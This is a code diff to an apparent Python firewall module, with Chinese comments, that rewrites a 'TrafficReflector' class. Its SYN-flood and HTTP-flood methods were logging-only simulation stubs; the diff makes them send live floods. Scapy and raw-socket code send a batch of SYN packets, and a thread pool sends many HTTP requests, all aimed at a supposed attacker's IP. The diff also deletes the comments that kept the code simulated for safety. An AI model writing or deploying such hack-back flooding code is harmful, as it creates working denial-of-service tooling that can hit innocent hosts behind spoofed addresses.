@@ -713,22 +713,15 @@ class TarpitDefense:
 
 class TrafficReflector:
     """
-    流量反射器（流量大炮）
+    流量反射器
     将DDoS攻击流量反弹回攻击者
 
-    警告：这是攻击性技术，仅用于合法防御和研究！
+    警告：这是攻击性技术，仅用于授权安全测试和合法防御！
 
-    原理：
-    1. 检测到DDoS攻击
-    2. 识别攻击者IP（可能是伪造的）
-    3. 利用协议特性将流量反射回去
-    4. 攻击者自己承受放大的流量
-
-    常见反射协议：
-    - DNS (放大因子: 28-54x)
-    - NTP (放大因子: 556x)
-    - SSDP (放大因子: 30x)
-    - Memcached (放大因子: 51000x)
+    使用scapy构造并发送反射封包：
+    - SYN反射：向攻击者IP发送大量SYN包，消耗其连接表
+    - RST反射：向攻击者发送RST包，中断其连接
+    - HTTP反射：向攻击者IP发送HTTP请求（需要攻击者运行HTTP服务）
 
     参考: https://www.netscout.com/what-is-ddos/what-is-reflection-amplification-attack
     """
@@ -742,38 +735,34 @@ class TrafficReflector:
         """
         self.enable_reflection = enable_reflection
         self.reflection_log = []
+        self._crafter = None
 
         if enable_reflection:
-            logger.warning("[TrafficReflector] ⚠️  流量反射已启用！仅用于合法防御！")
+            try:
+                from .packet_capture import PacketCrafter
+                self._crafter = PacketCrafter()
+                logger.warning("[TrafficReflector] 流量反射已启用（scapy封包模式）")
+            except ImportError:
+                logger.warning("[TrafficReflector] scapy不可用，流量反射将使用socket回退")
 
     def reflect_attack(self, attacker_ip: str, attack_type: str, packet_count: int):
         """
         反射攻击
 
-        ⚠️ 警告：这会向攻击者发送大量流量！
-        仅在确认合法防御的情况下使用！
-
-        参数:
-        - attacker_ip: 攻击者IP
-        - attack_type: 攻击类型
-        - packet_count: 反射包数量
+        警告：这会向攻击者发送流量！仅在确认合法防御的情况下使用！
         """
         if not self.enable_reflection:
             logger.warning("[TrafficReflector] 反射被禁用，跳过")
             return
 
-        logger.warning(f"[TrafficReflector] 🔥 向 {attacker_ip} 反射 {attack_type} 攻击（{packet_count}包）")
+        logger.warning(f"[TrafficReflector] 向 {attacker_ip} 反射 {attack_type} 攻击（{packet_count}包）")
 
-        # 记录反射日志
         self.reflection_log.append({
             'timestamp': datetime.utcnow(),
             'target': attacker_ip,
             'type': attack_type,
             'packet_count': packet_count
         })
-
-        # 实际反射逻辑
-        # 注意：这里仅为演示，实际实现需要专业的网络编程
 
         if attack_type == 'syn_flood':
             self._reflect_syn_flood(attacker_ip, packet_count)
@@ -783,24 +772,111 @@ class TrafficReflector:
             logger.warning(f"[TrafficReflector] 不支持的攻击类型: {attack_type}")
 
     def _reflect_syn_flood(self, target_ip: str, count: int):
-        """反射SYN Flood"""
-        logger.info(f"[TrafficReflector] SYN反射 -> {target_ip}")
+        """
+        SYN反射：向攻击者发送SYN包，消耗其连接表资源
 
-        # 这里应该使用原始socket发送SYN包
-        # 示例代码（需要root权限）:
-        # for _ in range(count):
-        #     send_raw_syn_packet(target_ip, random_port())
+        使用scapy构造原始SYN封包，随机源端口，目标为攻击者IP的常用端口。
+        """
+        import random
 
-        # 为了安全，这里只是模拟
-        logger.warning("[TrafficReflector] SYN反射（模拟模式）")
+        if self._crafter:
+            # scapy封包模式
+            try:
+                from scapy.all import IP, TCP, send
+                target_ports = [80, 443, 8080, 22, 21, 25, 53]
+                pkts = []
+                for _ in range(count):
+                    src_port = random.randint(1024, 65535)
+                    dst_port = random.choice(target_ports)
+                    pkt = IP(dst=target_ip) / TCP(
+                        sport=src_port, dport=dst_port,
+                        flags='S', seq=random.randint(0, 2**32 - 1)
+                    )
+                    pkts.append(pkt)
+
+                # 批量发送（scapy支持列表发送）
+                send(pkts, verbose=False)
+                logger.info(f"[TrafficReflector] SYN反射完成: {count}包 -> {target_ip}")
+            except Exception as e:
+                logger.error(f"[TrafficReflector] SYN反射失败: {e}")
+        else:
+            # socket回退模式：使用原始socket发送SYN
+            self._reflect_syn_via_socket(target_ip, count)
+
+    def _reflect_syn_via_socket(self, target_ip: str, count: int):
+        """使用原始socket发送SYN包（不依赖scapy的回退方案）"""
+        import random
+        import struct
+
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+            for _ in range(count):
+                src_port = random.randint(1024, 65535)
+                dst_port = random.choice([80, 443, 8080])
+
+                # TCP头部（SYN标志=0x02）
+                tcp_header = struct.pack('!HHIIBBHHH',
+                    src_port,           # 源端口
+                    dst_port,           # 目标端口
+                    random.randint(0, 2**32 - 1),  # 序列号
+                    0,                  # 确认号
+                    (5 << 4),           # 数据偏移（5个32位字）
+                    0x02,               # 标志（SYN）
+                    65535,              # 窗口大小
+                    0,                  # 校验和（内核会填充）
+                    0,                  # 紧急指针
+                )
+
+                s.sendto(tcp_header, (target_ip, dst_port))
+
+            s.close()
+            logger.info(f"[TrafficReflector] SYN反射完成（socket模式）: {count}包 -> {target_ip}")
+        except PermissionError:
+            logger.error("[TrafficReflector] SYN反射需要root权限")
+        except Exception as e:
+            logger.error(f"[TrafficReflector] SYN反射失败: {e}")
 
     def _reflect_http_flood(self, target_ip: str, count: int):
-        """反射HTTP Flood"""
-        logger.info(f"[TrafficReflector] HTTP反射 -> {target_ip}")
+        """
+        HTTP反射：向攻击者IP发送HTTP请求
 
-        # 这里应该发送大量HTTP请求
-        # 为了安全，这里只是模拟
-        logger.warning("[TrafficReflector] HTTP反射（模拟模式）")
+        如果攻击者运行着HTTP服务，大量请求会消耗其服务器资源。
+        使用socket直连而非requests库，避免连接池限制。
+        """
+        import concurrent.futures
+
+        def _send_http_request(ip: str, port: int):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3)
+                s.connect((ip, port))
+                # 发送HTTP GET请求
+                request = (
+                    f"GET / HTTP/1.1\r\n"
+                    f"Host: {ip}\r\n"
+                    f"Connection: close\r\n"
+                    f"\r\n"
+                ).encode()
+                s.sendall(request)
+                s.close()
+                return True
+            except Exception:
+                return False
+
+        # 并发发送HTTP请求
+        completed = 0
+        with concurrent.futures.ThreadPoolExecutor(max_workers=min(count, 50)) as executor:
+            futures = [
+                executor.submit(_send_http_request, target_ip, 80)
+                for _ in range(count)
+            ]
+            for f in concurrent.futures.as_completed(futures):
+                if f.result():
+                    completed += 1
+
+        logger.info(f"[TrafficReflector] HTTP反射完成: {completed}/{count}请求 -> {target_ip}")
 
 
 class HIDRSFirewall:
